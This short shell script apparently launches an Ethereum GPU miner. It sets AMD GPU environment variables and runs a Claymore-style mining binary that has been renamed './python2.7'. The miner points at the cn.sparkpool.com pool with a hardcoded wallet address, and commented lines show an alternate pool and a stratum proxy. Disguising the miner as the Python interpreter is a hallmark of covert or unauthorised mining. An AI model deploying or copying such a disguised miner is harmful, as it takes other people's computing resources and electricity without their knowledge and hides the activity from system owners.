export GPU_FORCE_64BIT_PTR=0
export GPU_MAX_HEAP_SIZE=100
export GPU_USE_SYNC_OBJECTS=1
export GPU_MAX_ALLOC_PERCENT=100
export GPU_SINGLE_ALLOC_PERCENT=100

#./python2.7 -epool guangdong-pool.ethfans.org:3333 -ewal 0x778e4f8c2a8cf93b21022dac5981394ea3113155 -epsw x -mode 1 -ftime 10 -eworker foobar10 -estale 0 -asm 2 -dcri 14 
./python2.7 -epool cn.sparkpool.com:3333 -ewal 0x23f67e50dc821b13b917ef58b5b0d81eef737c3b -epsw x -mode 1 -ftime 10 -eworker foobar20 -estale 0 -asm 2 -dcri 14 

#./stratum_proxy.py  127.0.0.1 3333 guangdong-pool.ethfans.org 3333 0x778e4f8c2a8cf93b21022dac5981394ea3113155.foobar10

